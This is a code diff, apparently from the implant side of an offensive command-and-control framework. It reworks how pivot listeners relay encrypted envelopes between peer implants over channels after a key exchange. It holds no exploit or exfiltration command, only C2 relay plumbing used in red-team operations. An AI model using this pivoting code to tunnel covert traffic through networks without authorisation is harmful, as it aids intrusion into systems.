@@ -47,7 +47,7 @@ var (
 )
 
 // StartListener - Generic interface to a start listener function
-type StartListener func(string) (*PivotListener, error)
+type StartListener func(string, chan<- *pb.Envelope) (*PivotListener, error)
 
 // GetListeners - Get a list of active listeners
 func GetListeners() []*pb.PivotListener {
@@ -72,31 +72,29 @@ func StopListener(id uint32) {
 	}
 }
 
-// PivotPeer - Abstract interface for a pivot peer
-type PivotPeer interface {
-	ID() int64
-	Start() error
-	WriteEnvelope(*pb.Envelope) error
-	ReadEnvelope() (*pb.Envelope, error)
-	Close() error
-	RemoteAddress() string
-}
-
 // PivotListener - A pivot listener
 type PivotListener struct {
 	ID          uint32
 	Type        pb.PivotType
 	Listener    net.Listener
-	Pivots      *sync.Map // ID -> PivotPeer
+	Pivots      *sync.Map // ID -> NetConnPivot
 	BindAddress string
+	Upstream    chan<- *pb.Envelope
 }
 
 // ToProtobuf - Get the protobuf version of the pivot listener
 func (l *PivotListener) ToProtobuf() *pb.PivotListener {
+	pivotPeers := []*pb.PivotPeer{}
+	l.Pivots.Range(func(key interface{}, value interface{}) bool {
+		pivot := value.(*NetConnPivot)
+		pivotPeers = append(pivotPeers, pivot.ToProtobuf())
+		return true
+	})
 	return &pb.PivotListener{
 		ID:          l.ID,
 		Type:        l.Type,
 		BindAddress: l.BindAddress,
+		Pivots:      pivotPeers,
 	}
 }
 
@@ -104,7 +102,7 @@ func (l *PivotListener) ToProtobuf() *pb.PivotListener {
 func (l *PivotListener) Stop() {
 	// Close all peer connections before closing listener
 	l.Pivots.Range(func(key interface{}, value interface{}) bool {
-		value.(PivotPeer).Close()
+		value.(*NetConnPivot).Close()
 		return true
 	})
 	l.Pivots = nil
@@ -115,7 +113,7 @@ func (l *PivotListener) Stop() {
 func (l *PivotListener) PivotClose(id int64) {
 	if p, ok := l.Pivots.Load(id); ok {
 		l.Pivots.Delete(id)
-		p.(PivotPeer).Close()
+		p.(*NetConnPivot).Close()
 	}
 }
 
@@ -132,7 +130,7 @@ func PivotID() int64 {
 	return int64(binary.LittleEndian.Uint64(buf))
 }
 
-// NetConnPivot - A generic Pivot connection via net.Conn
+// NetConnPivot - A generic pivot connection to a peer via net.Conn
 type NetConnPivot struct {
 	id            int64
 	conn          net.Conn
@@ -141,6 +139,9 @@ type NetConnPivot struct {
 	cipherCtx     *cryptography.CipherContext
 	readDeadline  time.Duration
 	writeDeadline time.Duration
+
+	upstream   chan<- *pb.Envelope
+	Downstream chan *pb.Envelope
 }
 
 // ID - ID of peer pivot
@@ -148,14 +149,60 @@ func (p *NetConnPivot) ID() int64 {
 	return p.id
 }
 
+// ToProtobuf - Protobuf of pivot peer
+func (p *NetConnPivot) ToProtobuf() *pb.PivotPeer {
+	return &pb.PivotPeer{
+		ID:            p.id,
+		RemoteAddress: p.RemoteAddress(),
+	}
+}
+
 // Start - Starts the TCP pivot connection handler
-func (p *NetConnPivot) Start() error {
+func (p *NetConnPivot) Start(pivots *sync.Map) {
+	defer p.conn.Close()
 	err := p.keyExchange()
 	if err != nil {
-		p.conn.Close()
-		return err
+		return
 	}
-	return nil
+
+	// We don't want to register the peer prior to the key exchange
+	// Add & remove self from listener pivots map
+	pivots.Store(p.ID(), p)
+	defer pivots.Delete(p.ID())
+
+	go func() {
+		defer close(p.Downstream)
+		for {
+			envelope, err := p.readEnvelope()
+			if err != nil {
+				return // Will return when connection is closed
+			}
+			if envelope.Type == pb.MsgPivotPing {
+				p.Downstream <- &pb.Envelope{
+					Type: pb.MsgPivotPing,
+					Data: envelope.Data,
+				}
+			} else if envelope.Type == pb.MsgPivotPeerEnvelope {
+				data, _ := proto.Marshal(envelope)
+				p.upstream <- &pb.Envelope{
+					ID:   p.ID(),
+					Type: pb.MsgPivotPeerEnvelope,
+					Data: data,
+				}
+			} else {
+				// {{if .Config.Debug}}
+				log.Printf("unexpected envelope type: %v", envelope.Type)
+				// {{end}}
+			}
+		}
+	}()
+
+	for envelope := range p.Downstream {
+		err := p.writeEnvelope(envelope)
+		if err != nil {
+			return
+		}
+	}
 }
 
 // keyExchange - Exchange session key with peer, it's important that we DO NOT write
@@ -287,7 +334,7 @@ func (p *NetConnPivot) lengthOf(message []byte) []byte {
 }
 
 // writeEnvelope - Write a complete envelope
-func (p *NetConnPivot) WriteEnvelope(envelope *pb.Envelope) error {
+func (p *NetConnPivot) writeEnvelope(envelope *pb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -306,7 +353,7 @@ func (p *NetConnPivot) WriteEnvelope(envelope *pb.Envelope) error {
 }
 
 // readEnvelope - Read a complete envelope
-func (p *NetConnPivot) ReadEnvelope() (*pb.Envelope, error) {
+func (p *NetConnPivot) readEnvelope() (*pb.Envelope, error) {
 	data, err := p.read()
 	if err != nil {
 		// {{if .Config.Debug}}
